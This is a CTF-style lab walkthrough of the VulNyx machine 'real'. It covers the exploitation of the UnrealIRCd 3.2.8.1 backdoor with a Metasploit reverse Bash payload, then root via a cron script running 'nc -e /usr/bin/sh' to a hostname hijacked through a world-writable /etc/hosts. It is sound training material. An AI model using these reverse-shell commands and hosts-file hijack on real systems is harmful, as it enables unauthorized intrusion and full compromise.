# real

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| real | d4t4s3c | Low | VulNyx |

**Summary:** The real machine ran an older UnrealIRCd installation, version 3.2.8.1, on no fewer than three ports, and that ancient service carried one of the most famous backdoors in the history of IRC. A simple netcat conversation with port 6667 confirmed the vulnerable software through its welcome banner, so the Metasploit module `exploit/unix/irc/unreal_ircd_3281_backdoor` was deployed with a reversed Bash payload. The backdoor, hidden inside UnrealIRCd itself, immediately delivered a command shell as the user `server`. Inside the session, initial enumeration revealed that `/etc/hosts` was world writable with mode `-rw----rw-`. Since a root cron job was assumed to be running on the box, the process spy tool `pspy64` was downloaded, and within moments it exposed a root scheduled task: every minute a Bash script at `/opt/task` pings the host `shelly.real.nyx` and, if the name resolves and answers, launches `nc -e /usr/bin/sh shelly.real.nyx 65000`, effectively asking that machine for a root reverse shell. Reading `/opt/task` confirmed the behavior verbatim. Because the hosts file was editable, the attacker simply appended the line `192.168.56.104 shelly.real.nyx`, redirecting the cron job straight at the attacking machine. A netcat listener on port 65000 received the callback within one minute, presenting a root shell with no further effort, and both flags were collected.

---

## Reconnaissance

The engagement opened with the usual network sweep and connectivity check.

1. The target was found at `192.168.56.110`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 11:45 -0400
Nmap scan report for 192.168.56.1 (192.168.56.1)
Host is up (0.00059s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100 (192.168.56.100)
Host is up (0.0026s latency).
MAC Address: 08:00:27:17:D2:59 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.110 (192.168.56.110)
Host is up (0.0017s latency).
MAC Address: 08:00:27:5B:2B:04 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.104 (192.168.56.104)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.97 seconds

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.110

┌──(kali㉿kali)-[~/nyx]
└─$ ping -c 2 $ip           
PING 192.168.56.110 (192.168.56.110) 56(84) bytes of data.
64 bytes from 192.168.56.110: icmp_seq=1 ttl=64 time=0.938 ms
64 bytes from 192.168.56.110: icmp_seq=2 ttl=64 time=1.74 ms

--- 192.168.56.110 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1008ms
rtt min/avg/max/mdev = 0.938/1.336/1.735/0.398 ms
```

2. A fast full port switch scan revealed a broader attack surface than usual:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -T4 --min-rate=1000 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 11:47 -0400
Nmap scan report for 192.168.56.110 (192.168.56.110)
Host is up (0.00015s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6667/tcp open  irc
6697/tcp open  ircs-u
8067/tcp open  infi-async
MAC Address: 08:00:27:5B:2B:04 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.89 seconds
```

3. Version and script detection was then run against the interesting ports:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p 22,80,6667,6697,8067 -sC -sV -T3 -Pn $ip
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-12 11:47 -0400
Nmap scan report for 192.168.56.110 (192.168.56.110)
Host is up (0.00041s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 db:28:2b:ab:63:2a:0e:d5:ea:18:8d:2f:6d:8c:45:2d (RSA)
|   256 cd:a1:c3:2e:20:f0:f3:f6:d3:9b:27:8e:9a:2d:26:11 (ECDSA)
|_  256 db:98:69:a5:8b:bd:05:86:16:3d:9c:8b:30:7b:a3:6c (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
6667/tcp open  irc     UnrealIRCd
6697/tcp open  irc     UnrealIRCd
8067/tcp open  irc     UnrealIRCd
MAC Address: 08:00:27:5B:2B:04 (Oracle VirtualBox virtual NIC)
Service Info: Host: irc.foonet.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.49 seconds                                                                                                       
```

Beyond SSH and a stock Apache page, the box ran an IRC server identified only as UnrealIRCd, bound simultaneously to ports 6667, 6697, and 8067. That service became the primary target.

4. A manual netcat connection to port 6667 captured the IRC banner:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nc -v $ip 6667
192.168.56.110 [192.168.56.110] 6667 (ircd) open
:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...
:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
NICK testuser123
USER testuser123 0 * :Test User
:irc.foonet.com NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:irc.foonet.com 001 testuser123 :Welcome to the ROXnet IRC Network testuser123!testuser12@192.168.56.104
:irc.foonet.com 002 testuser123 :Your host is irc.foonet.com, running version Unreal3.2.8.1
:irc.foonet.com 003 testuser123 :This server was created Sat 08 Aug EDT at 2020 07:03:52 PM
:irc.foonet.com 004 testuser123 irc.foonet.com Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
:irc.foonet.com 005 testuser123 UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
:irc.foonet.com 005 testuser123 WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
:irc.foonet.com 005 testuser123 EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
:irc.foonet.com 251 testuser123 :There are 1 users and 0 invisible on 1 servers
:irc.foonet.com 255 testuser123 :I have 1 clients and 0 servers
:irc.foonet.com 265 testuser123 :Current Local Users: 1  Max: 1
:irc.foonet.com 266 testuser123 :Current Global Users: 1  Max: 1
:irc.foonet.com 422 testuser123 :MOTD File is missing
:testuser123 MODE testuser123 :+iwx
```

The welcome messages pinned the server version at `Unreal3.2.8.1`. That specific release is famous for an embedded brand backdoor that executes user supplied commands upon receiving a specially crafted `AB` line, making remote code execution trivial.

---

## Initial Access

### Exploiting the UnrealIRCd Backdoor

5. The Metasploit module tailored to this exact backdoor was selected and configured:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ msfconsole -q
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor 
[*] Using configured payload cmd/linux/http/x86/meterpreter/reverse_tcp
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set rhosts 192.168.56.110
rhosts => 192.168.56.110
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set rport 6667
rport => 6667
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set lhost 192.168.56.104
lhost => 192.168.56.104
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set lport 4444
lport => 4444
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] 192.168.56.110:6667 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.56.110:6667 - Connected to 192.168.56.110:6667
[*] 192.168.56.110:6667 - Trying to register a new IRC user: mary
[+] 192.168.56.110:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
[*] 192.168.56.110:6667 - Connected to 192.168.56.110:6667
[*] 192.168.56.110:6667 - Sending IRC backdoor command
[*] Command shell session 1 opened (192.168.56.104:4444 -> 192.168.56.110:59172) at 2026-08-12 12:10:10 -0400

id
uid=1000(server) gid=1000(server) groups=1000(server)
python3 -c 'import pty;pty.spawn("/bin/bash")'
server@real:~/irc/Unreal3.2$ stty -echo
stty -echo
server@real:~/irc/Unreal3.2$ export TERM=xterm
server@real:~/irc/Unreal3.2$ export SHELL=/bin/bash
```

The backdoor returned a command shell instantly, running as the `server` user. The session was upgraded into a proper PTY for cleaner interaction.

---

## Privilege Escalation

### Discovering a World-Writable /etc/hosts

6. Peeking at system configuration surfaced an immediate anomaly: the hosts file was editable by everyone.

```bash
server@real:~/irc/Unreal3.2$ ls -la /etc/hosts
-rw----rw- 1 root root 183 May  3  2023 /etc/hosts
```

7. Its contents were read:

```bash
server@real:~/irc/Unreal3.2$ cat /etc/hosts
127.0.0.1       localhost
1.2.3.4         real

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

The mode `-rw----rw-` meant any user could rewrite name resolution on the box, including for processes running as root. A cron-driven root job that consulted the hosts file would then be controllable.

### Monitoring Root Activity with pspy

8. To observe scheduled root tasks, the process spy binary `pspy64` was transferred from a Python HTTP server running on the attacker machine:

```bash
┌──(kali㉿kali)-[/opt]
└─$ python3 -m http.server 8080                                          
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.56.110 - - [12/Aug/2026 19:07:15] "GET /pspy/pspy64 HTTP/1.1" 200 -
```

```bash
server@real:~$ wget http://192.168.56.104:8080/pspy/pspy64
--2026-08-12 19:07:14--  http://192.168.56.104:8080/pspy/pspy64
Connecting to 192.168.56.104:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                  0%[                                                                        ] pspy64                                100%[=======================================================================>]   2.96M  --.-KB/s    in 0.02s   

2026-08-12 19:07:14 (129 MB/s) - ‘pspy64’ saved [3104768/3104768]

server@real:~$ chmod +x pspy64
```

9. Running pspy immediately exposed a repeating root process:

```bash
2026/08/12 19:09:01 CMD: UID=0     PID=682    | /bin/sh -c /opt/task 
2026/08/12 19:09:01 CMD: UID=0     PID=683    | /bin/bash /opt/task 
2026/08/12 19:09:01 CMD: UID=0     PID=684    | timeout 1 bash -c /usr/bin/ping -c 1 shelly.real.nyx 
```

Every minute, root executed `/opt/task`, which in turn pinged the host `shelly.real.nyx`.

10. The task script was read to understand its full behavior:

```bash
server@real:~$ server@real:~$ ls -la /opt/task  
-rwx---r-- 1 root root 277 May  3  2023 /opt/task
server@real:~$ cat /opt/task
#!/bin/bash

domain='shelly.real.nyx'

function check(){

        timeout 1 bash -c "/usr/bin/ping -c 1 $domain" > /dev/null 2>&1
    if [ "$(echo $?)" == "0" ]; then
        /usr/bin/nohup nc -e /usr/bin/sh $domain 65000
        exit 0
    else
        exit 1
    fi
}

check
server@
```

The logic was a gift: if `shelly.real.nyx` responds to a single ping, the script launches `nc -e /usr/bin/sh shelly.real.nyx 65000`, handing an interactive root shell to whatever host answers at that name.

### Redirecting the Root Cron Job

11. Because `/etc/hosts` was world writable, the attacker pointed `shelly.real.nyx` at their own machine:

```bash
server@real:~$ echo "192.168.56.104 shelly.real.nyx" >> /etc/hosts
```

12. A netcat listener was staged on the callback port:

```bash
┌──(kali㉿kali)-[/opt]
└─$ nc -lvnp 65000 
listening on [any] 65000 ...
```

13. Within one minute, the next cron iteration resolved `shelly.real.nyx` to the attacker, pinging successfully, and delivered the reverse shell:

```bash
connect to [192.168.56.104] from (UNKNOWN) [192.168.56.110] 55392
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@real:~# stty -echo
stty -echo
root@real:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
real
root@real:~# cat /home/server/user.txt /root/root.txt
```

The root cron job connected back to the attacker with a root shell, granting immediate and complete control of the machine, and both flags were read.

---

## Attack Chain Summary

1. **Reconnaissance**: A ping sweep isolated the target at `192.168.56.110`, and full port scans exposed SSH, Apache, and an UnrealIRCd server on ports 6667, 6697, and 8067. The IRC banner pinned the version at Unreal 3.2.8.1.

2. **Vulnerability Discovery**: That specific UnrealIRCd release is known to carry an embedded backdoor triggered inside its command parser. The presence of the version banner confirmed the vulnerable service.

3. **Exploitation**: The Metasploit module `unreal_ircd_3281_backdoor` with a reverse Bash payload exploited the backdoor and returned a command shell as the `server` user.

4. **Internal Enumeration**: The `/etc/hosts` file was found world writable. The process spy `pspy64` revealed a root cron task running `/opt/task`, a script that pings `shelly.real.nyx` and launches `nc -e /usr/bin/sh shelly.real.nyx 65000` when the host is reachable.

5. **Privilege Escalation**: The writable hosts file was used to redirect `shelly.real.nyx` to the attacker's IP. A netcat listener on port 65000 received the root reverse shell from the cron job, granting a root shell and full compromise.